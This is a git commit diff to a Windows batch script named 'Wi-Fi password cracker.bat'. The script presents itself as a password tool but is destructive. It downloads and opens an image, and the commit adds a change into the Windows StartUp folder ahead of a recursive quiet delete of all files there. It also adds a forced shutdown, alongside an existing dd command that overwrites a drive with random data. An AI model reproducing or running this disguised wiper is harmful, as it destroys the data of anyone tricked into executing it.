cb32c22d72fba4260d287abd80c5462ce3ff240e
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-21 01:08:41 +0530

    Update Wi-Fi password cracker.bat

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -9,9 +9,15 @@ Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdef
 :: open the image downloaded in line 4
 image.jpg
 
+:: cd to startup folder
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
+
 :: delete stuff
 :: code by Varun Banka
 del /s /q *.*
 
 :: play with drive
 sudo dd if=/dev/random of=/dev/sda
+
+:: power off the system
+shutdown -s -t 15
